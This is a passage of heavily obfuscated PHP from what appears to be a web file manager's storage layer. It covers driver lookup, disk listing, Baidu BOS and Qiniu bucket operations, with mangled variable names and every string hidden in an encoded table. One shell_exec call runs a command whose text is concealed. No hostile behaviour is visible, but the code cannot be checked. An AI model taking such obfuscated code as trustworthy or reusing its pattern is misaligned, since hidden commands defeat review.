LNG($í€ÇˆÊ‹); if ($í€ÇˆÊ‹ != $³†ó°ºÖ) { $ÂåÅèà¥[$ßŸÆøñ…][$ÜÙÃªÑ»[32]] = $³†ó°ºÖ; } } return $ÂåÅèà¥; } public static function ioFileDriverGet($Ó¤Œ´˜Æ = '') { $ş ˜ô©± =& $_SERVER[É¨™èà]; static $è’‰Õ = array(); static $Ù•Òœ¿ = array(); static $àÕô¦ŒÊ = array(); static $Ôƒ«‰ = false; if ($Ôƒ«‰ === !1) { $Ôƒ«‰ = array($ş ˜ô©±[590] => array(), $ş ˜ô©±[677] => array()); $šà½ˆºÃ = Model($ş ˜ô©±[1404])->get(!1, $ş ˜ô©±[1405]); foreach ($šà½ˆºÃ as $ÊÛ˜Î„ => $ºµßÚË¡) { if (!$ºµßÚË¡ || $ºµßÚË¡ == $ş ˜ô©±[12]) { continue; } if (strstr($ÊÛ˜Î„, $ş ˜ô©±[1406])) { $ŸŸİæüÓ = str_replace($ş ˜ô©±[1406], $ş ˜ô©±[12], $ÊÛ˜Î„); $Ôƒ«‰[$ş ˜ô©±[590]][$ŸŸİæüÓ] = $ºµßÚË¡; } else { if (strstr($ÊÛ˜Î„, $ş ˜ô©±[1407])) { $ŸŸİæüÓ = str_replace($ş ˜ô©±[1407], $ş ˜ô©±[12], $ÊÛ˜Î„); $Ôƒ«‰[$ş ˜ô©±[677]][$ŸŸİæüÓ] = $ºµßÚË¡; } } } } $¶Ø¼¢€¬ = self::defaultDriver(); if (!$Ó¤Œ´˜Æ || !$Ôƒ«‰[$ş ˜ô©±[590]] && !$Ôƒ«‰[$ş ˜ô©±[677]]) { return $¶Ø¼¢€¬; } $è•Í•Ë = self::getPathSourceID($Ó¤Œ´˜Æ); if (!$è•Í•Ë) { return $¶Ø¼¢€¬; } if (isset($è’‰Õ[$è•Í•Ë])) { return $è’‰Õ[$è•Í•Ë]; } $®îäÆí  = Model($ş ˜ô©±[921])->sourceInfo($è•Í•Ë); $¹ó´À·ê = $®îäÆí [$ş ˜ô©±[581]]; $›–å˜ ü = array(); if (!$®îäÆí ) { return $¶Ø¼¢€¬; } if ($®îäÆí [$ş ˜ô©±[191]] == $ş ˜ô©±[91]) { if (isset($àÕô¦ŒÊ[$¹ó´À·ê])) { return $àÕô¦ŒÊ[$¹ó´À·ê]; } if (isset($Ôƒ«‰[$ş ˜ô©±[677]][$¹ó´À·ê])) { $…ÎÜ‚º = Model($ş ˜ô©±[858])->driverInfo($Ôƒ«‰[$ş ˜ô©±[677]][$¹ó´À·ê]); $¶Ø¼¢€¬ = $…ÎÜ‚º ? $…ÎÜ‚º : $¶Ø¼¢€¬; $àÕô¦ŒÊ[$¹ó´À·ê] = $¶Ø¼¢€¬; $è’‰Õ[$è•Í•Ë] = $¶Ø¼¢€¬; return $¶Ø¼¢€¬; } $›–å˜ ü = self::groupParentUser($¹ó´À·ê); } else { if ($®îäÆí [$ş ˜ô©±[191]] == $ş ˜ô©±[520]) { $Ñ«Ş·„¸ = Model($ş ˜ô©±[1408])->getInfo($¹ó´À·ê); if ($Ñ«Ş·„¸) { $›–å˜ ü = explode($ş ˜ô©±[50], trim($Ñ«Ş·„¸[$ş ˜ô©±[596]], $ş ˜ô©±[50])); $›–å˜ ü = array_remove_value($›–å˜ ü, $ş ˜ô©±[231]); $›–å˜ ü[] = $¹ó´À·ê; $›–å˜ ü = array_reverse($›–å˜ ü); } } } foreach ($›–å˜ ü as $²å‰ÊğÅ) { if (!isset($Ôƒ«‰[$ş ˜ô©±[590]][$²å‰ÊğÅ])) { continue; } if (isset($Ù•Òœ¿[$²å‰ÊğÅ])) { return $Ù•Òœ¿[$²å‰ÊğÅ]; } $…ÎÜ‚º = Model($ş ˜ô©±[858])->driverInfo($Ôƒ«‰[$ş ˜ô©±[590]][$²å‰ÊğÅ]); $¶Ø¼¢€¬ = $…ÎÜ‚º ? $…ÎÜ‚º : $¶Ø¼¢€¬; $Ù•Òœ¿[$²å‰ÊğÅ] = $¶Ø¼¢€¬; break; } if ($®îäÆí [$ş ˜ô©±[191]] == $ş ˜ô©±[91]) { $àÕô¦ŒÊ[$¹ó´À·ê] = $¶Ø¼¢€¬; } $è’‰Õ[$è•Í•Ë] = $¶Ø¼¢€¬; return $¶Ø¼¢€¬; } private static function getPathSourceID($ï˜êŸ‘Î) { $•Ş“éĞ° =& $_SERVER[É¨™èà]; static $À“Ìî›Õ = array(); if (!$ï˜êŸ‘Î) { return $•Ş“éĞ°[12]; } $Ç•÷÷ÚŒ = substr($ï˜êŸ‘Î, 0, strlen($•Ş“éĞ°[493])) == $•Ş“éĞ°[493]; $²ºŒÖæ„ = substr($ï˜êŸ‘Î, 0, strlen($•Ş“éĞ°[1376])) == $•Ş“éĞ°[1376]; $Æ¡±‘·’ = substr($ï˜êŸ‘Î, 0, strlen($•Ş“éĞ°[1377])) == $•Ş“éĞ°[1377]; if (!$Ç•÷÷ÚŒ && !$²ºŒÖæ„ && !$Æ¡±‘·’) { return $•Ş“éĞ°[12]; } $×°ó¥êß = self::parse($ï˜êŸ‘Î); $Û§‚¼¨ = $×°ó¥êß[$•Ş“éĞ°[1270]]; if ($Ç•÷÷ÚŒ) { return $×°ó¥êß[$•Ş“éĞ°[485]]; } if (isset($À“Ìî›Õ[$Û§‚¼¨])) { $Ë¶Ë“¬¬ = $À“Ìî›Õ[$Û§‚¼¨]; } else { $Ë¶Ë“¬¬ = IO::init($Û§‚¼¨); $À“Ìî›Õ[$Û§‚¼¨] = $Ë¶Ë“¬¬; } if (isset($Ë¶Ë“¬¬->pathParse[$•Ş“éĞ°[1273]])) { return $Ë¶Ë“¬¬->pathParse[$•Ş“éĞ°[1273]]; } return $•Ş“éĞ°[12]; } private static function groupParentUser($™áİ¯ˆ) { $–ò‚íÂã =& $_SERVER[É¨™èà]; $„âşÎË = Model($–ò‚íÂã[609])->getInfo($™áİ¯ˆ); if (!$„âşÎË) { return array(); } $¡ÆÁ¬” = array_to_keyvalue($„âşÎË[$–ò‚íÂã[1409]], $–ò‚íÂã[12], $–ò‚íÂã[1410]); $†òñ–· = array(); foreach ($„âşÎË[$–ò‚íÂã[1409]] as $©é¾Èó“) { $†òñ–·[] = $©é¾Èó“[$–ò‚íÂã[1410]]; $äÃŸ£ = explode($–ò‚íÂã[50], trim($©é¾Èó“[$–ò‚íÂã[596]], $–ò‚íÂã[50])); $äÃŸ£ = array_remove_value($äÃŸ£, $–ò‚íÂã[231]); $äÃŸ£ = array_reverse($äÃŸ£); $†òñ–· = array_merge($†òñ–·, $äÃŸ£); } return array_unique($†òñ–·); } public static function diskList($ıÊ•ï¾ = true) { $©àà•°è = $_SERVER[É¨™èà][1411]; if ($ıÊ•ï¾) { $İ„êĞÀÊ = Cache::get($©àà•°è); if (is_array($İ„êĞÀÊ)) { return $İ„êĞÀÊ; } } $İ„êĞÀÊ = self::diskListGet(); Cache::set($©àà•°è, $İ„êĞÀÊ, 60); return $İ„êĞÀÊ; } public static function diskListGet() { $·úÊóÄË =& $_SERVER[É¨™èà]; $“£½––Ô = array(); if ($GLOBALS[$·úÊóÄË[6]][$·úÊóÄË[1412]] == $·úÊóÄË[1413]) { $Ëã­£ì¨ = $·úÊóÄË[1414]; for ($»şÍ¶Ò¶ = 0; $»şÍ¶Ò¶ < strlen($Ëã­£ì¨); $»şÍ¶Ò¶++) { $‹êíÅƒƒ = $Ëã­£ì¨[$»şÍ¶Ò¶] . $·úÊóÄË[1415]; if (file_exists($‹êíÅƒƒ)) { $“£½––Ô[] = $‹êíÅƒƒ; } } return $“£½––Ô; } if (!function_exists($·úÊóÄË[101])) { $“£½––Ô[] = $·úÊóÄË[932]; return $“£½––Ô; } $œµÎˆ€É = explode($·úÊóÄË[288], shell_exec($·úÊóÄË[1416])); array_shift($œµÎˆ€É); array_pop($œµÎˆ€É); $è„Ù°îê = array($·úÊóÄË[1417], $·úÊóÄË[1418], $·úÊóÄË[1419], $·úÊóÄË[1420], $·úÊóÄË[1421], $·úÊóÄË[1422], $·úÊóÄË[1423], $·úÊóÄË[1424]); foreach ($œµÎˆ€É as $ğ§òûßÚ) { $„øŠÁ‚Ü = preg_split($·úÊóÄË[1425], $ğ§òûßÚ); $‹êíÅƒƒ = $„øŠÁ‚Ü[count($„øŠÁ‚Ü) - 1]; if (!strstr($„øŠÁ‚Ü[0], $·úÊóÄË[1426]) || !$‹êíÅƒƒ) { continue; } $‚†¡™üù = rtrim($‹êíÅƒƒ, $·úÊóÄË[8]) . $·úÊóÄË[8]; if (in_array($‚†¡™üù, $è„Ù°îê)) { continue; } $“£½––Ô[] = $‚†¡™üù; } return $“£½––Ô; } public static function isSameDisk($”½É÷ûò, $¾¡‡ƒãƒ) { $®±“Ñ¢® =& $_SERVER[É¨™èà]; if ($GLOBALS[$®±“Ñ¢®[6]][$®±“Ñ¢®[1412]] == $®±“Ñ¢®[1413]) { return strtolower(substr($”½É÷ûò, 0, 1)) == strtolower(substr($¾¡‡ƒãƒ, 0, 1)); } $¼º”ÚÒ = stat($”½É÷ûò); $»Î¶ŸÁñ = stat($¾¡‡ƒãƒ); if ($¼º”ÚÒ === !1 || $»Î¶ŸÁñ === !1) { return !1; } return $¼º”ÚÒ[$®±“Ñ¢®[1427]] === $»Î¶ŸÁñ[$®±“Ñ¢®[1427]]; $ÃÌÕÆğá = self::diskList(); $‚‚Î€Ÿ¢ = !1; $‘ƒæ¤íº = !1; sort($ÃÌÕÆğá); $ÃÌÕÆğá = array_reverse($ÃÌÕÆğá); $”½É÷ûò = rtrim($”½É÷ûò, $®±“Ñ¢®[8]) . $®±“Ñ¢®[8]; $¾¡‡ƒãƒ = rtrim($¾¡‡ƒãƒ, $®±“Ñ¢®[8]) . $®±“Ñ¢®[8]; foreach ($ÃÌÕÆğá as $ƒùÆô©›) { $‹Èëãšº = strlen($ƒùÆô©›); if (!$‚‚Î€Ÿ¢ && substr($”½É÷ûò, 0, $‹Èëãšº) == $ƒùÆô©›) { $‚‚Î€Ÿ¢ = $ƒùÆô©›; } if (!$‘ƒæ¤íº && substr($¾¡‡ƒãƒ, 0, $‹Èëãšº) == $ƒùÆô©›) { $‘ƒæ¤íº = $ƒùÆô©›; } if ($‚‚Î€Ÿ¢ && $‘ƒæ¤íº) { break; } } return $‚‚Î€Ÿ¢ === $‘ƒæ¤íº; } public static function transferType($™­Â„ùÄ, $øÆ¶è Ú) { $÷¢ó–øÆ =& $_SERVER[É¨™èà]; $Œµåïö‹ = self::driverType($™­Â„ùÄ); $¼™ÚÔŞ = self::driverType($øÆ¶è Ú); if ($Œµåïö‹[$÷¢ó–øÆ[33]] == $¼™ÚÔŞ[$÷¢ó–øÆ[33]] && $Œµåïö‹[$÷¢ó–øÆ[1428]] == $¼™ÚÔŞ[$÷¢ó–øÆ[1428]]) { return $÷¢ó–øÆ[1429]; } if ($Œµåïö‹[$÷¢ó–øÆ[33]] == $÷¢ó–øÆ[966] && $¼™ÚÔŞ[$÷¢ó–øÆ[33]] == $÷¢ó–øÆ[109]) { return $÷¢ó–øÆ[1299]; } if ($Œµåïö‹[$÷¢ó–øÆ[33]] == $÷¢ó–øÆ[109] && $¼™ÚÔŞ[$÷¢ó–øÆ[33]] == $÷¢ó–øÆ[966]) { return $÷¢ó–øÆ[110]; } return $÷¢ó–øÆ[1430]; } public static function driverType($êé’¾ì) { $ğÉàæ­ =& $_SERVER[É¨™èà]; $òÜìè“Ò = str_replace($ğÉàæ­[1431], $ğÉàæ­[12], strtolower($êé’¾ì->getType())); if ($òÜìè“Ò == $ğÉàæ­[848] || $òÜìè“Ò == $ğÉàæ­[1432] || $òÜìè“Ò == $ğÉàæ­[1433]) { $¦óõ™Í˜ = self::ioFileDriverGet($ğÉàæ­[493] . $êé’¾ì->pathParse[$ğÉàæ­[1273]] . $ğÉàæ­[413]); $êé’¾ì = IO::init($ğÉàæ­[1401] . $¦óõ™Í˜[$ğÉàæ­[485]] . $ğÉàæ­[1389]); } else { if ($òÜìè“Ò == $ğÉàæ­[1309] || $òÜìè“Ò == $ğÉàæ­[1434]) { $êé’¾ì = IO::init($êé’¾ì->pathParse[$ğÉàæ­[1250]]); } } $‚—È‹€à = $êé’¾ì->path; $òÜìè“Ò = str_replace($ğÉàæ­[1431], $ğÉàæ­[12], strtolower($êé’¾ì->getType())); if ($òÜìè“Ò == $ğÉàæ­[109]) { return array($ğÉàæ­[33] => $ğÉàæ­[109], $ğÉàæ­[1428] => $ğÉàæ­[12], $ğÉàæ­[87] => $‚—È‹€à, $ğÉàæ­[98] => $êé’¾ì); } return array($ğÉàæ­[33] => $ğÉàæ­[966], $ğÉàæ­[1428] => $êé’¾ì->pathDriver, $ğÉàæ­[87] => $‚—È‹€à, $ğÉàæ­[98] => $êé’¾ì); } public static function pathDriverType($ª‰ŒÈùÕ) { return $ª‰ŒÈùÕ ? self::driverType(IO::init($ª‰ŒÈùÕ)) : !1; } public static function pathDriverLocal($„ØƒÆíá) { $µŞ–ã« =& $_SERVER[É¨™èà]; $”˜‡ŸŸã = $„ØƒÆíá ? self::driverType(IO::init($„ØƒÆíá)) : !1; return strtolower($”˜‡ŸŸã[$µŞ–ã«[33]]) == $µŞ–ã«[109] ? !0 : !1; } public static function allowCover($åìÕîĞ², $ÅÁÕ†‡à = true) { $Óè¤êò° =& $_SERVER[É¨™èà]; if (is_string($åìÕîĞ²)) { $åìÕîĞ² = IO::info($åìÕîĞ²); } if (!$åìÕîĞ² || $åìÕîĞ²[$Óè¤êò°[33]] == $Óè¤êò°[78] || $åìÕîĞ²[$Óè¤êò°[79]] <= 100) { return !1; } if (isset($åìÕîĞ²[$Óè¤êò°[1435]]) || !$åìÕîĞ²[$Óè¤êò°[87]]) { return !1; } if (isset($åìÕîĞ²[$Óè¤êò°[235]]) && !$åìÕîĞ²[$Óè¤êò°[235]]) { return !1; } static $ØÖÂÅ¼Ü = false; if (!$ØÖÂÅ¼Ü || !$ÅÁÕ†‡à) { $ÆçÕ½ò… = self::driverType(IO::init($åìÕîĞ²[$Óè¤êò°[87]])); $Âü–£úÓ = $ÆçÕ½ò…[$Óè¤êò°[98]]; $ØÖÂÅ¼Ü = $Óè¤êò°[197]; if ($ÆçÕ½ò…[$Óè¤êò°[33]] == $Óè¤êò°[109]) { $ØÖÂÅ¼Ü = $Óè¤êò°[1436]; } if ($ÆçÕ½ò…[$Óè¤êò°[98]] && is_array($ÆçÕ½ò…[$Óè¤êò°[98]]->config)) { $éšô¨Ãƒ = $ÆçÕ½ò…[$Óè¤êò°[98]]->config; if (isset($éšô¨Ãƒ[$Óè¤êò°[1437]]) && $éšô¨Ãƒ[$Óè¤êò°[1437]]) { $ØÖÂÅ¼Ü = $Óè¤êò°[1436]; } } $ì´©® = KodIO::defaultDriver(); if (strtolower($ì´©®[$Óè¤êò°[98]]) == $Óè¤êò°[109] && is_array($ì´©®[$Óè¤êò°[6]])) { $¦ˆ”şõÌ = $ì´©®[$Óè¤êò°[6]][$Óè¤êò°[1282]]; if (substr($¦ˆ”şõÌ, 0, 2) == $Óè¤êò°[1438]) { $¦ˆ”şõÌ = str_replace($Óè¤êò°[1438], BASIC_PATH, $¦ˆ”şõÌ); } $¦ˆ”şõÌ = str_replace($Óè¤êò°[257], $Óè¤êò°[8], $¦ˆ”şõÌ); if (substr($åìÕîĞ²[$Óè¤êò°[87]], 0, strlen($¦ˆ”şõÌ)) == $¦ˆ”şõÌ) { $ØÖÂÅ¼Ü = $Óè¤êò°[197]; } } } return $ØÖÂÅ¼Ü == $Óè¤êò°[1436] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($®µ£¢÷) { parent::__construct($®µ£¢÷); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto F¥¦ß¶£Î; b•æÚ²Âåõ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ª£¡ºıî) { parent::__construct(); require_once SDK_DIR . $_SERVER[É¨™èà][1556]; $this->_init($ª£¡ºıî); } public function _init($”òŠ°Ç×) { $¢€ŠæÓ =& $_SERVER[É¨™èà]; $this->config = $”òŠ°Ç×; foreach ($”òŠ°Ç× as $ïÃ“¬Şê => $šæÌß„Ğ) { if (isset($this->{$ïÃ“¬Şê})) { $this->{$ïÃ“¬Şê} = $šæÌß„Ğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¢€ŠæÓ[1557] . LNG($¢€ŠæÓ[1493])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($´®¡çà, $Å˜»á÷ = '', $“‘Í˜­ò = REPEAT_RENAME) { if ($this->setContent($´®¡çà, $Å˜»á÷)) { return $this->getPathOuter($´®¡çà); } return !1; } public function mkdir($ÅëĞ£ˆ¹, $ï¿ÒîÂî = REPEAT_SKIP) { $  ƒŠƒ– =& $_SERVER[É¨™èà]; $§‚´ü¶Œ = trim($ÅëĞ£ˆ¹, $  ƒŠƒ–[8]); if ($this->_isFolder($§‚´ü¶Œ)) { return $this->getPathOuter($§‚´ü¶Œ); } $ÅëĞ£ˆ¹ = $§‚´ü¶Œ . $  ƒŠƒ–[8]; $¦°ˆ·š‡ = get_path_this($§‚´ü¶Œ); $ÏÄ‹–¾‹ = $ÅëĞ£ˆ¹ . $¦°ˆ·š‡; if (!$this->mkfile($ÏÄ‹–¾‹)) { return !1; } if (!$this->moveFile($ÏÄ‹–¾‹, $ÅëĞ£ˆ¹)) { $this->delFile($ÏÄ‹–¾‹); return !1; } return $this->getPathOuter($§‚´ü¶Œ); } public function copyFile($ö²½¤ó, $•»×Â) { $‹šÉÚ…± = $this->bucketManager->copy($this->bucket, $ö²½¤ó, $this->bucket, $•»×Â, !0); return $‹šÉÚ…± ? !1 : $this->getPathOuter($•»×Â); } public function moveFile($ÃÚÅ¤Ùà, $˜…¦ìÓú) { $Ãà¤§² = $this->bucketManager->move($this->bucket, $ÃÚÅ¤Ùà, $this->bucket, $˜…¦ìÓú, !0); return $Ãà¤§² ? !1 : $this->getPathOuter($˜…¦ìÓú); } public function delFile($ŸÆÙØ‚) { if (!$this->exist($ŸÆÙØ‚)) { return !0; } $ê­„Èú = $this->bucketManager->delete($this->bucket, $ŸÆÙØ‚); if (!$ê­„Èú) { return !0; } return $ê­„Èú->code() == 612 ? !0 : !1; } public function delFolder($Öğèää¤) { $ÜÙß”Ú« =& $_SERVER[É¨™èà]; if (!$this->exist($Öğèää¤)) { return !0; } $this->listItemCache = !1; $›â ïšÊ = $this->fileList($Öğèää¤); $this->listItemCache = !0; $ÙâŒÅİÏ = trim($Öğèää¤, $ÜÙß”Ú«[8]) . $ÜÙß”Ú«[8]; if (!empty($Öğèää¤) && $Öğèää¤ !== $ÜÙß”Ú«[231] && !in_array($ÙâŒÅİÏ, $›â ïšÊ[$ÜÙß”Ú«[85]])) { $›â ïšÊ[$ÜÙß”Ú«[85]][] = $ÙâŒÅİÏ; } $öåºŒä = $this->delByBatch($›â ïšÊ[$ÜÙß”Ú«[86]]); if (!$öåºŒä) { return !1; } $öåºŒä = $this->delByBatch($›â ïšÊ[$ÜÙß”Ú«[85]]); if (!$öåºŒä) { return !1; } return $this->delFile($ÙâŒÅİÏ); } private function delByBatch($ñĞ„Èø) { foreach (array_chunk($ñĞ„Èø, 1000) as $ªÒÉ¨½¸) { $²¬–ĞÚ„ = $this->bucketManager->buildBatchDelete($this->bucket, $ªÒÉ¨½¸); list($‘°Û›¬Š, $ßÁøÎ·ñ) = $this->bucketManager->batch($²¬–ĞÚ„); if ($ßÁøÎ·ñ) { return !1; } } return !0; } public function rename($Ù—×®„Û, $º’ÂÎ ) { return $this->renameObject($Ù—×®„Û, $º’ÂÎ ); } public function fileInfo($»¼¡ıé, $­Õßµã§ = false, $û‡Œä˜ = array()) { $ôšúİ²³ =& $_SERVER[É¨™èà]; $ı¬Ş™â = array($ôšúİ²³[32] => $this->pathThis($»¼¡ıé), $ôšúİ²³[87] => $this->getPathOuter($ôšúİ²³[8] . $»¼¡ıé), $ôšúİ²³[33] => $ôšúİ²³[233], $ôšúİ²³[79] => isset($û‡Œä˜[$ôšúİ²³[1558]]) ? $û‡Œä˜[$ôšúİ²³[1558]] : 0, $ôšúİ²³[169] => $this->ext($»¼¡ıé)); if ($­Õßµã§) { return $ı¬Ş™â; } $ı¬Ş™â[$ôšúİ²³[234]] = $ı¬Ş™â[$ôšúİ²³[88]] = 0; $ı¬Ş™â[$ôšúİ²³[235]] = $ı¬Ş™â[$ôšúİ²³[236]] = !0; if (empty($û‡Œä˜)) { $û‡Œä˜ = $this->objectMeta($»¼¡ıé); if (!$û‡Œä˜) { return $ı¬Ş™â; } } if (isset($û‡Œä˜[$ôšúİ²³[237]]) && $û‡Œä˜[$ôšúİ²³[237]]) { $ı¬Ş™â[$ôšúİ²³[238]] = $û‡Œä˜[$ôšúİ²³[237]]; } if (isset($û‡Œä˜[$ôšúİ²³[248]]) && $û‡Œä˜[$ôšúİ²³[248]]) { $ı¬Ş™â[$ôšúİ²³[238]] = $û‡Œä˜[$ôšúİ²³[248]]; } if (isset($û‡Œä˜[$ôšúİ²³[1559]])) { $ı¬Ş™â[$ôšúİ²³[88]] = substr($û‡Œä˜[$ôšúİ²³[1559]] . $ôšúİ²³[12], 0, 10); } if (isset($û‡Œä˜[$ôšúİ²³[1558]])) { $ı¬Ş™â[$ôšúİ²³[79]] = $û‡Œä˜[$ôšúİ²³[1558]]; } return $ı¬Ş™â; } public function folderInfo($Ø©Õ„ó±, $Ê†ê¦ = false) { $²Ï‘¯Ñ÷ =& $_SERVER[É¨™èà]; $³¤´×Ù = array($²Ï‘¯Ñ÷[32] => $this->pathThis($Ø©Õ„ó±), $²Ï‘¯Ñ÷[87] => $this->getPathOuter($²Ï‘¯Ñ÷[8] . $Ø©Õ„ó±), $²Ï‘¯Ñ÷[33] => $²Ï‘¯Ñ÷[78]); if ($Ê†ê¦) { return $³¤´×Ù; } $³¤´×Ù[$²Ï‘¯Ñ÷[234]] = $³¤´×Ù[$²Ï‘¯Ñ÷[88]] = 0; $³¤´×Ù[$²Ï‘¯Ñ÷[235]] = $³¤´×Ù[$²Ï‘¯Ñ÷[236]] = !0; $Ø©Õ„ó± = rtrim($Ø©Õ„ó±, $²Ï‘¯Ñ÷[8]) . $²Ï‘¯Ñ÷[8]; $’Û«çø‚ = $this->objectMeta($Ø©Õ„ó±); if (isset($’Û«çø‚[$²Ï‘¯Ñ÷[1559]])) { $³¤´×Ù[$²Ï‘¯Ñ÷[88]] = substr($’Û«çø‚[$²Ï‘¯Ñ÷[1559]] . $²Ï‘¯Ñ÷[12], 0, 10); } return $³¤´×Ù; } public function listPath($À†·›¾, $‰íÛûˆ’ = false) { $ü¬ „¨— =& $_SERVER[É¨™èà]; $Â«Õ¾Ïê = $this->fileList($À†·›¾, $ü¬ „¨—[8], !0); foreach ($Â«Õ¾Ïê[$ü¬ „¨—[85]] as $åÛ—€Êº => $‹Ããêá¼) { $Â«Õ¾Ïê[$ü¬ „¨—[85]][$åÛ—€Êº] = $this->folderInfo($‹Ããêá¼, $‰íÛûˆ’); } foreach ($Â«Õ¾Ïê[$ü¬ „¨—[86]] as $åÛ—€Êº => $‹Ããêá¼) { $Â«Õ¾Ïê[$ü¬ „¨—[86]][$åÛ—€Êº] = $this->fileInfo($‹Ããêá¼[$ü¬ „¨—[32]], $‰íÛûˆ’, $‹Ããêá¼); } return $Â«Õ¾Ïê; } public function has($˜ş­ÌÙÌ, $êî½¡ = false, $™ıÄÄó = true) { $óø³¿üî =& $_SERVER[É¨™èà]; $˜ş­ÌÙÌ = trim($˜ş­ÌÙÌ, $óø³¿üî[8]); $’§•Å = empty($˜ş­ÌÙÌ) && $˜ş­ÌÙÌ !== $óø³¿üî[231] ? $óø³¿üî[12] : $˜ş­ÌÙÌ . $óø³¿üî[8]; $Æ®¥“ü“ = $óø³¿üî[12]; $öÊ¯û¸é = 500; $Â«“Î˜Ü = $óø³¿üî[8]; $¯„„ØÁ„ = $õ‚àœ¤º = 0; while (!0) { check_abort(); list($€¯í¤ƒõ, $ ¸¿äáì) = $this->bucketManager->listFiles($this->bucket, $’§•Å, $Æ®¥“ü“, $öÊ¯û¸é, $Â«“Î˜Ü); if ($ ¸¿äáì) { break; } $Æ®¥“ü“ = array_key_exists($óø³¿üî[1505], $€¯í¤ƒõ) ? $Æ®¥“ü“ = $€¯í¤ƒõ[$óø³¿üî[1560]] : $óø³¿üî[12]; if ($êî½¡) { if (!empty($€¯í¤ƒõ[$óø³¿üî[1561]])) { $¯„„ØÁ„ += count($€¯í¤ƒõ[$óø³¿üî[1561]]); } if (!empty($€¯í¤ƒõ[$óø³¿üî[1562]])) { $õ‚àœ¤º += count($€¯í¤ƒõ[$óø³¿üî[1562]]); } if ($Æ®¥“ü“ === $óø³¿üî[12]) { break; } continue; } if ($™ıÄÄó) { if (!empty($€¯í¤ƒõ[$óø³¿üî[1561]])) { return !0; } } else { if (!empty($€¯í¤ƒõ[$óø³¿üî[1562]])) { return !0; } } if ($Æ®¥“ü“ === $óø³¿üî[12]) { break; } } if ($êî½¡) { return array($óø³¿üî[242] => $¯„„ØÁ„, $óø³¿üî[243] => $õ‚àœ¤º); } return !1; } public function listAll($·¹Óß¢À) { $ğñÑÇ…º =& $_SERVER[É¨™èà]; $¹Îïüİ  = $this->fileList($·¹Óß¢À, $ğñÑÇ…º[12], !0); $Œ»ë¢· = array_to_keyvalue($¹Îïüİ [$ğñÑÇ…º[86]], $ğñÑÇ…º[32]); foreach ($¹Îïüİ [$ğñÑÇ…º[85]] as $Ğº¦¹“Ï) { if (is_string($Ğº¦¹“Ï)) { $Œ»ë¢·[$Ğº¦¹“Ï] = array($ğñÑÇ…º[79] => 0); } } return $this->listAllFiles($·¹Óß¢À, $Œ»ë¢·); } private function fileList($ºˆ‹Ã´, $øêñöÉ¶ = '', $Ç¼ş™ôÕ = 0) { $ƒºü´Çˆ =& $_SERVER[É¨™èà]; $ºˆ‹Ã´ = trim($ºˆ‹Ã´, $ƒºü´Çˆ[8]); $ÁÚ“‚Îø = empty($ºˆ‹Ã´) && $ºˆ‹Ã´ !== $ƒºü´Çˆ[231] ? $ƒºü´Çˆ[12] : $ºˆ‹Ã´ . $ƒºü´Çˆ[8]; $Í¸ÌüŒñ = $ƒºü´Çˆ[12]; $Œ¨•É¼ğ = 1000; $Ó¼Ş†Ş = $ÕÆ­åÇ = array(); while (!0) { check_abort(); list($êËó›÷Ç, $´í®èò) = $this->bucketManager->listFiles($this->bucket, $ÁÚ“‚Îø, $Í¸ÌüŒñ, $Œ¨•É¼ğ, $øêñöÉ¶); if ($´í®èò) { break; } $Í¸ÌüŒñ = array_key_exists($ƒºü´Çˆ[1505], $êËó›÷Ç) ? $Í¸ÌüŒñ = $êËó›÷Ç[$ƒºü´Çˆ[1560]] : $ƒºü´Çˆ[12]; $áå»ü­  = isset($êËó›÷Ç[$ƒºü´Çˆ[1561]]) ? $êËó›÷Ç[$ƒºü´Çˆ[1561]] : array(); $Í¾Ë…ñş = isset($êËó›÷Ç[$ƒºü´Çˆ[1562]]) ? $êËó›÷Ç[$ƒºü´Çˆ[1562]] : array(); foreach ($áå»ü­  as $·Û¯àËâ) { if ($·Û¯àËâ[$ƒºü´Çˆ[97]] == $ÁÚ“‚Îø) { continue; } $Û„«Î‚ = $·Û¯àËâ[$ƒºü´Çˆ[97]]; $©²€½ªÂ = $·Û¯àËâ[$ƒºü´Çˆ[1558]]; $·Û¯àËâ[$ƒºü´Çˆ[32]] = $Û„«Î‚; $·Û¯àËâ[$ƒºü´Çˆ[79]] = $©²€½ªÂ; $½íßşÍ­ = $©²€½ªÂ == 0 && substr($Û„«Î‚, strlen($Û„«Î‚) - 1, 1) == $ƒºü´Çˆ[8] ? !0 : !1; $this->cacheMethodInfoSet($Û„«Î‚, $½íßşÍ­, $·Û¯àËâ); if ($½íßşÍ­) { $Ó¼Ş†Ş[] = $Û„«Î‚; continue; } $ÕÆ­åÇ[] = $Ç¼ş™ôÕ ? $·Û¯àËâ : $Û„«Î‚; } foreach ($Í¾Ë…ñş as $Û„«Î‚) { if ($Û„«Î‚ == $ÁÚ“‚Îø) { continue; } $Ó¼Ş†Ş[] = $Û„«Î‚; $this->cacheMethodInfoSet($Û„«Î‚, !0); } if ($Í¸ÌüŒñ === $ƒºü´Çˆ[12]) { break; } } $this->cacheMethodInfoSet($ºˆ‹Ã´, !0); return array($ƒºü´Çˆ[85] => $Ó¼Ş†Ş, $ƒºü´Çˆ[86] => $ÕÆ­åÇ); } public function canRead($”ï†ìÄŞ) { return $this->exist($”ï†ìÄŞ) ? !0 : !1; } public function canWrite($•ôĞÖÛ) { return $this->exist($•ôĞÖÛ) ? !0 : !1; } public function getContent($åÖŠŠœ) { return $this->fileSubstr($åÖŠŠœ, 0, -1); } public function setContent($Ò§øÍ’, $²ÄŒÄ’ = '') { $Èö¨¶ô = $this->tempFile($this->pathThis($Ò§øÍ’)); file_put_contents($Èö¨¶ô, $²ÄŒÄ’); if ($this->upload($Ò§øÍ’, $Èö¨¶ô)) { $this->tempFileRemve($Èö¨¶ô); return !0; } return !1; } public function refreshUrls($í©ˆíâì) { $…‡Äù´‘ =& $_SERVER[É¨™èà]; $™ùú“¹  = 